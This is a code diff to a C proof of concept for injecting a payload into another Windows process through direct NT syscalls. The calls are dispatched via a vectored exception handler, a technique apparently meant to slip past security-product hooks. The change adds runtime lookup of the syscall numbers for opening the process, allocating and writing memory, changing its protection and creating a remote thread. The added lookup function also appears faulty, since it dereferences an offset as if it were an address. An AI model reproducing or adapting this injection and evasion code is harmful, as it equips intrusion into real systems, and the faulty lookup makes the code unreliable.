@@ -3,8 +3,6 @@
 #include <stdio.h>
 #include "incl.h"
 
-
-
 EXTERN_C DWORD64 SetSysCall(DWORD offset);
 
 BYTE* FindSyscallAddr(ULONG_PTR base) {
@@ -47,8 +45,28 @@ ULONG HandleException(PEXCEPTION_POINTERS exception_ptr) {
 		exception_ptr->ContextRecord->Rip = g_syscall_addr;
 		return EXCEPTION_CONTINUE_EXECUTION;
 	}
-	
+
 }
+
+ULONG GetSysCallNumber(char* FunctionName) {
+	HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
+	PVOID FunctionAddress = GetProcAddress(ntdll, FunctionName);
+	
+	// Getting the address at which the instruciton that will invokes the syscall
+	BYTE* syscall_instruction = FindSyscallAddr((ULONG_PTR)FunctionAddress);
+
+	ULONG SysCallNumber = 0;
+	ULONG Offset = 0;
+
+	// Determine the offset of the function within ntdll.dll
+	Offset = (ULONG)((ULONG_PTR)syscall_instruction - (ULONG_PTR)GetModuleHandleW(L"ntdll.dll"));
+
+	// The syscall number is stored in the second half of the instruction
+	SysCallNumber = *((PULONG)(Offset + 2));
+
+	return SysCallNumber;
+}
+
 
 void VectoredSyscalPOC(unsigned char payload[], SIZE_T payload_size, int pid) {
 	ULONG_PTR syscall_addr = 0x00;
@@ -62,7 +80,7 @@ void VectoredSyscalPOC(unsigned char payload[], SIZE_T payload_size, int pid) {
 	if (syscall_addr == NULL) {
 		printf("[-] Error Resolving syscall Address\n");
 		exit(-1);
-	} 
+	}
 	// storing syscall address globally
 	g_syscall_addr = syscall_addr;
 
@@ -72,16 +90,14 @@ void VectoredSyscalPOC(unsigned char payload[], SIZE_T payload_size, int pid) {
 	NTSTATUS status;
 	// Note: Below syscall might differ system to system 
 	// it's better to grab the syscall numbers dynamically
-	
-	enum syscall_no {
-		SysNtOpenProcess = 0x26,
-		SysNtAllocateVirtualMem = 0x18,
-		SysNtWriteVirtualMem = 0x3A,
-		SysNtProtectVirtualMem = 0x50,
-		SysNtCreateThreadEx = 0xBD
-	};
 
-	
+	ULONG SysNtOpenProcess = GetSysCallNumber("NtOpenProcess");
+	ULONG SysNtAllocateVirtualMemory = GetSysCallNumber("NtAllocateVirtualMemory");
+	ULONG SysNtWriteVirtualMemory = GetSysCallNumber("NtWriteVirtualMemory");
+	ULONG SysNtProtectVirtualMemory = GetSysCallNumber("NtProtectVirtualMemory");
+	ULONG SysNtCreateThreadEx = GetSysCallNumber("NtCreateThreadEx");
+
+
 	// Todo: encode syscall numbers
 	// init Nt APIs
 	// Instead of actual Nt API address we'll set the API with syscall number
@@ -91,11 +107,10 @@ void VectoredSyscalPOC(unsigned char payload[], SIZE_T payload_size, int pid) {
 	// exception handler via RIP register 
 
 	_NtOpenProcess pNtOpenProcess = (_NtOpenProcess)SysNtOpenProcess;
-	_NtAllocateVirtualMemory pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)SysNtAllocateVirtualMem;
-	_NtWriteVirtualMemory pNtWriteVirtualMemory = (_NtWriteVirtualMemory)SysNtWriteVirtualMem;
-	_NtProtectVirtualMemory pNtProtectVirtualMemory = (_NtProtectVirtualMemory)SysNtProtectVirtualMem;
-	_NtCreateThreadEx pNtCreateThreadEx = (_NtProtectVirtualMemory)SysNtCreateThreadEx;
-
+	_NtAllocateVirtualMemory pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)SysNtAllocateVirtualMemory;
+	_NtWriteVirtualMemory pNtWriteVirtualMemory = (_NtWriteVirtualMemory)SysNtWriteVirtualMemory;
+	_NtProtectVirtualMemory pNtProtectVirtualMemory = (_NtProtectVirtualMemory)SysNtProtectVirtualMemory;
+	_NtCreateThreadEx pNtCreateThreadEx = (_NtCreateThreadEx)SysNtCreateThreadEx;
 
 	HANDLE hProcess = { INVALID_HANDLE_VALUE };
 	HANDLE hThread = NULL;
